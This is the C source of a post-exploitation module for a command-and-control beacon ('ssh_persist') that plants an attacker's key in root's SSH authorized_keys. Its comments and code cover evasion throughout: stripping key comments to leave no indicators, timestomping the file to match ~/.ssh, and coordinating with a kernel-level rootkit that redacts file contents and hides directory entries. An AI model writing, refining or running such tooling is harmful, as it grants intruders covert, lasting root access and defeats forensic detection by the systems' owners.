/// ssh_persist.c — BOF: append an SSH authorized_keys entry for root
/// Compile: gcc -c -o ssh_persist.o ssh_persist.c -include bof_api.h -Os -fPIC
/// Usage: execute bof ssh_persist.o <pubkey-line> [target-path]
///
/// Appends the key to /root/.ssh/authorized_keys (creating the file and the
/// directory when missing), then fixes permissions (dir 0700, file 0600).
///
/// ★ 可选第二参数 = 目标文件路径。这不是"为了好测"才加的：`sshd_config` 的
///   `AuthorizedKeysFile` 本来就可改（`/etc/ssh/authorized_keys/%u` 是 Debian 系
///   常见形态），目标机未必是默认位置。副产品是判据可以在**独立测试文件**上走
///   **完全相同的代码路径**（`tools/p27_ssh_persist_verify.py`），从而**一次都不碰
///   真实的 /root/.ssh/authorized_keys** —— 那是操作者自己的 SSH 通道，
///   测试碰它没有任何收益、只有风险。
///
/// ══ 9.1b：内容层收口（ISS-085 / ISS-086）══════════════════════════════════
///
/// **承重实测**（`tools/.scratch/p27probe.sh`，独立 sshd + 独立端口 2222 +
/// 独立测试文件 + 临时测试密钥，5/5 全绿；真实 `/root/.ssh/authorized_keys` 全程未碰）：
///   E2b 同一把 key、**注释剥掉** ⇒ 仍能登录   ← sshd 不使用 comment 字段
///   E3  换成别人的 key         ⇒ 登不进      ← 证明上一条不是"根本没在查钥匙"
///   E4  多词注释               ⇒ 也能登录    ← 剥注释必须**按字段**而不是数空格
///
/// **为什么是"写入时不写 IOC"而不是"读时针式抹平"**（两条都是硬理由）：
///   ① 内核抹平**连 sshd 一起盲**。豁免通道是 `access(R_OK)` 探一次 + 带
///      `O_CLOEXEC` 开（`AxReadFileReal` 的头注），那是**我们 BOF 的协议** ——
///      sshd 不会做这次 `access()`，所以它读到的同样是被抹过的内容 ⇒
///      **我们自己的持久化 key 对 sshd 也消失 = 自己踢掉自己**。
///   ② 内核抹平只在**模块加载后**生效，而 authorized_keys 是**我们自己写的文件**
///      ⇒ 写入时不留 IOC 是**磁盘级干净**：任何通道（cat / scp / grep / 取证镜像）、
///      任何时刻（模块在没在）都干净。**"文件内容必须含 IOC 才能工作"的才需要读时伪造**
///      （cron/systemd/ld.so.preload 里的载荷路径就是那种）；这里的 IOC 只是注释，
///      它对 sshd 零作用 ⇒ 直接不写，比读时伪造更彻底。
///
/// **ISS-086（写这版时读出来的）**：原来的补换行守卫是 `if (total < key_len)` ——
///   那是"**写短了**才补 `\n`"，本意应是"末尾没有 `\n` 才补"。后果：参数不带尾随
///   换行（BOF 界面粘贴的常见形态）时，新行与上一行**粘连** ⇒ ①新那把 key 静默失效
///   （追加照样返回成功、回执照打 `[+]`）；②若文件**本人就不以 `\n` 结尾**
///   （手改过的 authorized_keys 很常见），粘连会**毁掉上一行** —— 而那一行可能是
///   运维自己的钥匙。修法：我们自己控制整行 ⇒ **无条件补 `\n`**。

#include "bof_api.h"

#define O_WRONLY   01
#define O_APPEND   02000
#define O_CREAT    0100

#define AX_AK_PATH     "/root/.ssh/authorized_keys"
#define AX_AK_DIR      "/root/.ssh"
#define AX_AK_MAX      65536

static int ax_is_sp(int c) {
    return c == ' ' || c == '\t' || c == '\n' || c == '\r';
}

/* 这些字符**可以**出现在 blob 与 blob 之前的分隔位；用于幂等比对的边界判定。 */
static int ax_is_sep(int c) {
    return c == ' ' || c == '\t' || c == '\n' || c == '\r';
}

static int ax_is_b64(int c) {
    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
           (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=';
}

/* keytype token：ssh-rsa / ssh-ed25519 / ecdsa-sha2-nistp256 /
 * sk-ssh-ed25519@openssh.com / *-cert-v01@openssh.com —— 全部落在这三个前缀里。 */
static int ax_is_keytype(const char *p, int n) {
    if (n >= 4 && AxStrncmp(p, "ssh-",   4) == 0) return 1;
    if (n >= 6 && AxStrncmp(p, "ecdsa-", 6) == 0) return 1;
    if (n >= 3 && AxStrncmp(p, "sk-",    3) == 0) return 1;
    return 0;
}

/* base64 公钥本体：真身至少 68 字符（ed25519）；32 是宽松下界，只用来挡垃圾。
 * ★ 全字符校验是**保底**的一部分：宁可认不出、原样写，也不要把人家的 key 改坏。 */
static int ax_is_blob(const char *p, int n) {
    if (n < 32) return 0;
    for (int i = 0; i < n; i++) if (!ax_is_b64((unsigned char)p[i])) return 0;
    return 1;
}

/* 解析一行 authorized_keys：行 = [options] <keytype> <base64> [comment]
 *
 * 出参全部是**相对 k 原始起点**的下标；认不出时返回 0，出参退化成"去掉首尾空白
 * 后的整行"，调用方据此**原样写**（不猜）。
 * 返 1 = 认出了 keytype+blob：*keep 截止到 blob 末尾（options 前缀被保留，
 *        注释被切掉），*boff/*blen 给出 blob 位置（**key 的身份**，幂等比对用）。
 */
static int ax_key_parse(const char *k, int n, int *start, int *keep,
                        int *boff, int *blen) {
    int b = 0, e = n;
    while (b < e && ax_is_sp((unsigned char)k[b])) b++;
    while (e > b && ax_is_sp((unsigned char)k[e - 1])) e--;

    *start = b; *keep = e - b; *boff = 0; *blen = 0;
    if (e <= b) return 0;

    int i = b;
    while (i < e) {
        int j = i;
        while (j < e && !ax_is_sp((unsigned char)k[j])) j++;

        if (ax_is_keytype(k + i, j - i)) {
            int p = j;
            while (p < e && ax_is_sp((unsigned char)k[p])) p++;
            int q = p;
            while (q < e && !ax_is_sp((unsigned char)k[q])) q++;
            if (ax_is_blob(k + p, q - p)) {
                *keep = q - b;                  /* 到 blob 结束为止 */
                *boff = p; *blen = q - p;
                return 1;
            }
            return 0;                           /* 认出 keytype 但 blob 不像 ⇒ 不动 */
        }
        i = j;
        while (i < e && ax_is_sp((unsigned char)k[i])) i++;
    }
    return 0;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    int key_len = 0;
    char *key = BeaconDataExtract(&parser, &key_len);
    if (!key || key_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ssh_persist: missing pubkey argument\n");
        return;
    }

    int start = 0, keep = 0, boff = 0, blen = 0;
    int parsed = ax_key_parse(key, key_len, &start, &keep, &boff, &blen);
    if (keep <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ssh_persist: empty pubkey line\n");
        return;
    }

    /* ── 可选第二参数：目标文件路径 ────────────────────────────────────────
     * ★ `BeaconDataExtract` 回的**不是 NUL 结尾串**（见 bof_api.h），
     *   而 `AxOpenFile` 要的是 C 串 ⇒ 必须自己拷贝 + 封口。
     *   没给第二参数时它早退并把 *size 写 0（ISS-070 修好的契约①）⇒ 走默认路径。 */
    char pbuf[256];
    char dbuf[256];
    char *path = AX_AK_PATH;
    char *dir  = AX_AK_DIR;

    int plen = 0;
    char *parg = BeaconDataExtract(&parser, &plen);
    if (parg && plen > 0) {
        int c = plen;
        if (c > (int)sizeof(pbuf) - 1) c = (int)sizeof(pbuf) - 1;
        for (int t = 0; t < c; t++) pbuf[t] = parg[t];
        pbuf[c] = '\0';
        path = pbuf;

        /* 取 dirname：mkdir / chmod 目录 / mtime 对齐都要用它。
         * 目的不是"支持任意路径"，而是让**测试路径走完全相同的代码路径** ——
         * 否则台面测的就不是产品。 */
        int last = -1;
        for (int t = 0; t < c; t++) if (pbuf[t] == '/') last = t;
        if (last > 0) {
            int d = last;
            if (d > (int)sizeof(dbuf) - 1) d = (int)sizeof(dbuf) - 1;
            for (int t = 0; t < d; t++) dbuf[t] = pbuf[t];
            dbuf[d] = '\0';
            dir = dbuf;
        }
    }

    /* 目录可能已存在 —— 只有下面的 open 失败才算错（保持原语义）。 */
    AxMkdir(dir, 0700);

    /* 读一次，供**两件事**用：幂等比对 + 结尾换行修复。
     * 形态复用 ld_preload_install 的 already-present（ISS-076 的 `AxReadFileReal`
     * 协议：`AxAccess` 探一次 + `O_CLOEXEC` 开 ⇒ 进 redact_fds 豁免表，拿到**真身**
     * 而不是 redact 的抹平版）。文件不存在时返 <0，按"空文件"处理。 */
    char *old = (char *)0;
    int old_len = AxReadFileReal(path, &old, AX_AK_MAX);
    if (old_len < 0 || !old) old_len = 0;

    /* 幂等：**同一把 key**（按 base64 blob 认身份，不看注释）不重复追加。
     * 重复行本身就是 IOC —— 真实工具不会把同一条写两遍。 */
    if (parsed && blen > 0 && old_len > 0) {
        for (int i = 0; i + blen <= old_len; i++) {
            if (AxStrncmp(old + i, key + boff, blen) == 0 &&
                (i == 0 || ax_is_sep((unsigned char)old[i - 1]))) {
                BeaconPrintf(CALLBACK_OUTPUT, "[*] ssh_persist: key already present\n");
                AxFree(old);
                AxChmod(path, 0600);
                AxChmod(dir, 0700);
                return;
            }
        }
    }

    int fd = AxOpenFile(path, O_WRONLY | O_APPEND | O_CREAT, 0600);
    if (fd < 0) {
        if (old) AxFree(old);
        BeaconPrintf(CALLBACK_ERROR, "[-] ssh_persist: cannot open %s\n", path);
        return;
    }

    /* ★★ ISS-086（**两半，缺一不可** —— 第一版只修了后半，被 p27 T5 当场抓住）：
     *   ① 现有内容**不以 `\n` 结尾**时先补一个分隔符。这种文件很常见：手改过的
     *      authorized_keys、以及**旧版 ssh_persist 自己造出来的**（原来那半截守卫
     *      写反，追加时不补行尾 ⇒ 它每跑一次就留下一个欠换行的末行，下一次追加
     *      就与它粘成一行）。粘连会**毁掉上一行** —— 那可能是运维自己的钥匙，
     *      属于自伤，比 IOC 严重得多。
     *      ★ 只是把末行"封口"，不改动它的任何字节；sshd 对两种形态都接受。
     *   ② 我们自己写的这一行**无条件**补 `\n`（原代码是 `if (total < key_len)`，
     *      即"写短了才补"，与"末尾没有 `\n` 才补"正好写反）。 */
    if (old_len > 0 && old[old_len - 1] != '\n') AxWriteFile(fd, "\n", 1);
    int w = AxWriteFile(fd, key + start, keep);
    AxWriteFile(fd, "\n", 1);
    AxCloseFile(fd);
    if (old) AxFree(old);

    AxChmod(path, 0600);
    AxChmod(dir, 0700);

    /* 时间戳：把 authorized_keys 的 mtime/atime 对齐 `~/.ssh`（与 ld_preload_install
     * 对齐 `/etc` 同形 —— 复用既有形态）。挡住了"文件比目录新得多"这个一眼可见的
     * 取证标记。★ 边界：**ctime 由内核维护，改不了**，别把这条当成"清理干净了"。 */
    long as = 0, ans = 0, ms = 0, mns = 0;
    if (AxFileTimes(dir, &as, &ans, &ms, &mns) == 0) {
        AxUtimensat(-100, path, as, ans, ms, mns);
    }

    /* G7 复核：本模块**刻意不自动登记 hide_names**。隐藏在这里是负收益：
     *   @visible: authorized_keys 是常见文件名，藏了反而让 `ls ~/.ssh` 反常；
     *             且 hide_names 的 key 无目录限定，会连带藏掉全系统同名 dirent
     *   · getdents 过滤只挡目录枚举，挡不住 `cat ~/.ssh/authorized_keys` —— 对手
     *     查 SSH 持久化本来就是读内容（陷阱 1），藏了等于没藏；
     *   · authorized_keys 是**极其常见**的文件名，看得见不算 IOC；反过来，
     *     `ls -la ~/.ssh` 里"有 .ssh 却列不出 authorized_keys"才反常；
     *   · hide_names 的 key 无目录限定，藏它会连带藏掉全系统同名 dirent。
     * 写在这里是为了**记录这个判断**，免得下一轮有人"顺手补上"。 */
    BeaconPrintf(CALLBACK_OUTPUT, "[+] ssh_persist: %s <- %d/%d bytes (%s)\n",
                 path, w > 0 ? w : 0, key_len,
                 parsed ? "comment stripped" : "kept verbatim (unrecognized line)");
}
